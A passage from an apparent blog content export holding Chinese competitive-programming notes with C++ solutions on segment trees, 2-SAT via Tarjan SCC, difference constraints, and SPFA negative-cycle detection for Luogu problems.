class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l&lt;=tree[i].l&amp;&amp;r&gt;=tree[i].r)&#123;</span><br><span class="line">        ans+=tree[i].sum;</span><br><span class="line">    <span class="comment">//    ans%=mod;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(tree[i].lazy)<span class="built_in">push_down</span>(i);</span><br><span class="line">        <span class="keyword">int</span> mid=tree[i].l+tree[i].r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(l&lt;=mid)<span class="built_in">query</span>(l,r,i&lt;&lt;<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(r&gt;mid)<span class="built_in">query</span>(l,r,i&lt;&lt;<span class="number">1</span>|<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sync</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;1.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="number">0</span>);</span><br><span class="line">    cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">sync</span>();</span><br><span class="line">    <span class="keyword">int</span> n,t;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">build</span>(<span class="number">1</span>,n,<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">while</span>(t--)&#123;</span><br><span class="line">        <span class="keyword">int</span> op,x,y,z;</span><br><span class="line">        cin&gt;&gt;op;</span><br><span class="line">        <span class="keyword">if</span>(op==<span class="number">1</span>)&#123;</span><br><span class="line">            cin&gt;&gt;x&gt;&gt;y&gt;&gt;z;</span><br><span class="line">            <span class="built_in">add</span>(x,y,z,<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            cin&gt;&gt;x&gt;&gt;y;</span><br><span class="line">            ans=<span class="number">0</span>;</span><br><span class="line">            <span class="built_in">query</span>(x,y,<span class="number">1</span>);</span><br><span class="line">            cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 数据结构 </category>
          
          <category> 线段树 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2-SAT学习笔记</title>
      <link href="/2022/02/23/2-SAT%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/02/23/2-SAT%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>很开心，图论的知识也是积少成多，回首往昔，我对图论的算法仅限于最短路算法($\text {dijkstra}$)和最小生成树($\text {kruskal&amp;prime}$) 。今天来学学这个 $\text {2-SAT}$ 问题。</p><span id="more"></span><h2 id="2-SAT简介"><a href="#2-SAT简介" class="headerlink" title="2-SAT简介"></a>2-SAT简介</h2><blockquote><p>$\text {SAT}$ 是适定性（Satisfiability）问题的简称。一般形式为 k - 适定性问题，简称 k-SAT。而当 $k&gt;2$ 时该问题为 NP 完全的。所以我们只研究 $k=2$ 的情况。</p><p>$\text {2-SAT}$，简单的说就是给出 个集合，每个集合有两个元素，已知若干个 ，表示 与 矛盾（其中 与 属于不同的集合）。然后从每个集合选择一个元素，判断能否一共选 个两两不矛盾的元素。显然可能有多种选择方案，一般题中只需要求出一种即可。(from OI WIKI)</p></blockquote><p>我想上面说的也比我说的稍微清楚点了，那么他的现实意义是什么呢？比较常见的就是逻辑推导了。</p><p>告诉你现在有 A，B，C三个人，且A和B是男生，如果B是男生，那么C是女生。问你这三个人的性别分别是什么，我们很容易可以知道A，B为男，C为女。</p><p>现在主要就是让计算机去计算这个问题怎么办呢？首先有一点可以确定的就是，一个人不能既是男又是女。如果存在这样的断言：如果A是男，那么A是女，这样的话A只能是女，因为A不可能既是男又是女，这个规定就为我们解决 $\text {2-SAT}$ 问题提供了思路。</p><p>我们假设有 $n$ 个人，那么我们建一个 $2\times n$ 个点的有向图，第如果 $i\le n$ 那么第 $i$ 个点表示 $i$ 为男，$i&gt;n$ 那么第 $i$ 个点表示第 $i-n$ 个人为女。$i\to j$有向边很显然表：如果选择点 $i$，那么一定要选择点 $j$，如果我们选择点 $i$ ，那么点 $i+n$ 或者是点 $i-n$ 一定不能被选中，否则我们就说点 $i$ 不能被选择。所以，如果 $i$ 与 $i$ 的对立面同时不能被选择，即它们在同一个强连通分量内，那么整个问题都是无解的，因为有一个人的性别无论怎么选始终无法满足要求。</p><p>一般情况下，解不唯一，我们通常只需要输出是否有解即可，因为如果输出方案的话它们还要设置check脚本。但是洛谷它还就搞了，神不神奇。</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p><a href="https://www.luogu.com.cn/problem/P4782">洛谷P4782</a></p><p>典型的 $\text {2-SAT}$ 问题，需要注意的是，它这里每个给出的条件都是或的关系，我们需要转换成边，那么我们想想怎么转换成一条边？如果它的条件给了 $x=1 \ or\ y=1 $ 。那么 $x=1$ 和 $y=1$ 是没有什么关系的，因为 $x=1$ 的时候 $y$ 没有限制，可以为 $1$ 可以为 $0$。但是呢，如果 $x=0$ 则一定推的出 $y=1$ 因为两个必须有一个满足，一个不满足会导致另一个一定要满足。所以我们就把一个条件的反面连接到另一个条件，同样另一个条件的反面也连到这个条件。</p><p>得到了一张有向图之后呢，我们先跑 $\text {tarjan}$ 强连通分量，观察是否存在 $i\le n$ 使得 $i$ 和 $i+n$ 是否属于同一个强连通分量，如果是，则无解。如果不是，则有解。(敲黑板)，这里需要注意了啊，这里跑 $\text{tarjan}$ 需要跑 $2\times n$ 个点。如果选中 $i$ 发现产生冲突那么选择该时事件的对立面则一定不会发生冲突。这里我们跑 $\text{dfs}$ ，把与之相连的所有点都打上被选中的标记，如果存在两个状态同时被选中，则返回 $\text{false}$ 并且逐层回溯，如果到最后都没发生冲突则已选中的状态固定，继续去搜索没有被打标记的状态。直到所有的状态都有一个对应的值，最后输出这个状态。</p><p>标程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 2000005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">&#125;edge[maxn&lt;&lt;<span class="number">1</span>],e[maxn&lt;&lt;<span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> root[maxn],root2[maxn],dfn[maxn],low[maxn],degree[maxn],vis[maxn],num[maxn],s[maxn],cnt,tot,top,cnt2,deep,n,m;</span><br><span class="line"><span class="keyword">int</span> sel[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">    edge[++cnt]=&#123;root[x],y&#125;;</span><br><span class="line">    root[x]=cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add2</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">    e[++cnt2]=&#123;root2[x],y&#125;;</span><br><span class="line">    root2[x]=cnt2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tarjan</span><span class="params">(<span class="keyword">int</span> u)</span></span>&#123;</span><br><span class="line">    dfn[u]=low[u]=++deep;</span><br><span class="line">    s[++top]=u;</span><br><span class="line">    vis[u]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=edge[i].next)&#123;</span><br><span class="line">        <span class="keyword">int</span> v=edge[i].to;</span><br><span class="line">        <span class="keyword">if</span>(!dfn[v])&#123;</span><br><span class="line">            <span class="built_in">tarjan</span>(v);</span><br><span class="line">            low[u]=<span class="built_in">min</span>(low[v],low[u]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(vis[v])&#123;</span><br><span class="line">            low[u]=<span class="built_in">min</span>(low[u],low[v]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(low[u]==dfn[u])&#123;</span><br><span class="line">        vis[u]=<span class="number">0</span>;</span><br><span class="line">        num[u]=++tot;</span><br><span class="line">        <span class="keyword">while</span>(s[top]!=u)&#123;</span><br><span class="line">            vis[s[top]]=<span class="number">0</span>;</span><br><span class="line">            num[s[top--]]=tot;</span><br><span class="line">        &#125;</span><br><span class="line">        top--;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> u)</span></span>&#123;</span><br><span class="line">    sel[u]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(sel[(u<span class="number">-1</span>)%n+<span class="number">1</span>]&amp;&amp;sel[(u<span class="number">-1</span>)%n+n+<span class="number">1</span>])&#123;</span><br><span class="line">        sel[u]=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=edge[i].next)&#123;</span><br><span class="line">        <span class="keyword">int</span> v=edge[i].to;</span><br><span class="line">        <span class="keyword">if</span>(sel[v]==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="built_in">dfs</span>(v))&#123;</span><br><span class="line">                sel[u]=<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sync</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="number">0</span>);</span><br><span class="line">    cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;1.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    <span class="built_in">sync</span>();</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="keyword">while</span>(m--)&#123;</span><br><span class="line">        <span class="keyword">int</span> x,y,z,w;</span><br><span class="line">        cin&gt;&gt;x&gt;&gt;y&gt;&gt;z&gt;&gt;w;</span><br><span class="line">        <span class="built_in">add</span>(x+(y)*n,z+(!w)*n);</span><br><span class="line">        <span class="built_in">add</span>(z+(w)*n,x+(!y)*n);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">2</span>*n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!dfn[i])<span class="built_in">tarjan</span>(i);</span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(num[i]==num[i+n])&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;IMPOSSIBLE\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(sel[i]==<span class="number">0</span>&amp;&amp;sel[i+n]==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="built_in">dfs</span>(i))&#123;</span><br><span class="line">                <span class="built_in">dfs</span>(i+n);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;POSSIBLE\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,sel[i]&gt;sel[i+n]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 图论 </category>
          
          <category> 2-SAT </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>差分约束的学习笔记</title>
      <link href="/2022/02/22/%E5%B7%AE%E5%88%86%E7%BA%A6%E6%9D%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/02/22/%E5%B7%AE%E5%88%86%E7%BA%A6%E6%9D%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>差分约束系统，就是给出一组形如 $x_i-x_j\le d$ 的不等式，求出这组不等式的一组解。这类问题通常转化为图论中的最短路来解。</p><span id="more"></span><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>那我们转换一下，假设 $x_i$ 为点 $i$ 的单源最短路长度，$x_j$ 为点 $j$ 的单源最短路长度。那么以上不等式就可以转换成 $dis[i]-dis[j]\le d\to dis[i]\le dis[j]+d$。</p><p>那么这个就转变成了 $j\to i$ 一条权值为 $d$ 的边的最短路搜索了。因为如果一条边 $i\to j$ 权值为 $d$ ，那么必然有 $dis[i]\le dis[j]+d$ ，如果不满足这个条件。我们用反证法证明一下这个结论，设一条边 $i\to j$ 权值为 $d$，且满足 $dis[i] &gt; dis[j]+d$，那么在一次单源最短路算法时，必然会导致 $i$ 点被松弛。即发生</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(dis[i]&gt;dis[j]+d)&#123;</span><br><span class="line">    dis[i]=dis[j]+d;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么我们可以得出结论：$dis[i]$ 一定不会比 $dis[j]+d$ 大，当 $i\to j$ 有一条权值为 $d$ 的边时。当然可以比它小，如果其它边有更短的走法。</p><p>所以当存在不等式 $x_i-x_j\le d$ 的时候，我们只需要建一条 $i\to j$ 权值为 $d$ 的边就能满足这个不等式了。</p><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>我们就根据不等式组建图，然后跑单源最短路。这里需要注意的是，如果图不连通，那并不是无解，说明它们不在同一个不等式组，相互之间都没有关联，那就分别求单源最短路即可。为了防止这个情况，我们一般都会添加一个超级源点，这个源点为 $0$ 或者是 $n+1$。然后建立一条源点到其它所有点的一条权值为 $d$ 的有向边。 </p><p>我们添加了 $0\to i(1\le i\le n)$ 权值为 $0$ 的有向边，相当于增加了以下约束条件：</p><p>$dis[i]\le dis[0]+0$ </p><p>添加这个约束条件问题是不大的，因为我们很容易看出来，在找到一组解的时候，给所有的未知数都加上一个相同的值，是不会影响结果的。这个结论是很容易的出来的，因为我们的表达式都是一正一负，然后带进不等式之后加上的常数都会消掉，还能解决图不连通的问题，一举多得。添加这个约束条件之后，我们可以发现得到的值一定都是负数，那么如果一定要正解的话，那么直接给所有的dis加上一个 $\max(dis)$ 就完了。</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p><a href="https://www.luogu.com.cn/problem/P5960">洛谷P5960</a></p><p>就依然是一个板子，然后最后判断以下负环无解的情况，没有就输出所有的 $dis$。</p><p>标程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 5005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> w;</span><br><span class="line">&#125;edge[maxn&lt;&lt;<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> root[maxn],degree[maxn],dis[maxn],e_cnt[maxn],in_que[maxn],cnt,n,m;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> w)</span></span>&#123;</span><br><span class="line">    edge[++cnt].next=root[x];</span><br><span class="line">    edge[cnt].to=y;</span><br><span class="line">    edge[cnt].w=w;</span><br><span class="line">    degree[y]++;</span><br><span class="line">    root[x]=cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">spfa</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(dis,<span class="number">0x3f</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(dis));</span><br><span class="line">    queue&lt;<span class="keyword">int</span>&gt;q;</span><br><span class="line">    q.<span class="built_in">push</span>(<span class="number">0</span>);</span><br><span class="line">    dis[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    e_cnt[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    in_que[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(q.<span class="built_in">size</span>())&#123;</span><br><span class="line">        <span class="keyword">int</span> u=q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        in_que[u]=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=edge[i].next)&#123;</span><br><span class="line">            <span class="keyword">int</span> v=edge[i].to,w=edge[i].w;</span><br><span class="line">            <span class="keyword">if</span>(dis[v]&gt;dis[u]+w)&#123;</span><br><span class="line">                dis[v]=dis[u]+w;</span><br><span class="line">                e_cnt[v]++;</span><br><span class="line">                <span class="keyword">if</span>(e_cnt[v]&gt;n)&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(!in_que[v])&#123;</span><br><span class="line">                    in_que[v]=<span class="number">1</span>;</span><br><span class="line">                    q.<span class="built_in">push</span>(v);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sync</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="number">0</span>);</span><br><span class="line">    cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">sync</span>();</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m; </span><br><span class="line">    <span class="keyword">while</span>(m--)&#123;</span><br><span class="line">        <span class="keyword">int</span> x,y,w;</span><br><span class="line">        cin&gt;&gt;x&gt;&gt;y&gt;&gt;w;</span><br><span class="line">        <span class="built_in">add</span>(y,x,w);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">add</span>(<span class="number">0</span>,i,<span class="number">0</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">spfa</span>())&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;NO\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> M=<span class="number">1e9</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cout&lt;&lt;dis[i]&lt;&lt;<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 图论 </category>
          
          <category> 差分约束 </category>
          
          <category> 单源最短路 </category>
          
          <category> spfa </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>负环判断</title>
      <link href="/2022/02/21/%E8%B4%9F%E7%8E%AF%E5%88%A4%E6%96%AD/"/>
      <url>/2022/02/21/%E8%B4%9F%E7%8E%AF%E5%88%A4%E6%96%AD/</url>
      
        <content type="html"><![CDATA[<p>前面讲到了<code>spfa</code>，然后有一个判断负环的操作，这个判断负环有更好的思路。</p><span id="more"></span><p>设$cnt[i]$为$s$到$i$的最短路中已经经过的路径条数，如果超过 $n$ 个边，那就说明有 $n-1$ 个点，必产生了负环，如果没有负环绝对是不会找到回路的。</p><h2 id="洛谷P3385"><a href="#洛谷P3385" class="headerlink" title="洛谷P3385"></a><a href="https://www.luogu.com.cn/problem/P3385">洛谷P3385</a></h2><p>emm直接给标程吧，就是最朴实无华的 $spfa$ 负环判断。</p><p>标程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 2005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> w;</span><br><span class="line">&#125;edge[maxn&lt;&lt;<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> root[maxn],dis[maxn],e_cnt[maxn],in_que[maxn],cnt;</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> w)</span></span>&#123;</span><br><span class="line">    edge[++cnt].to=y;</span><br><span class="line">    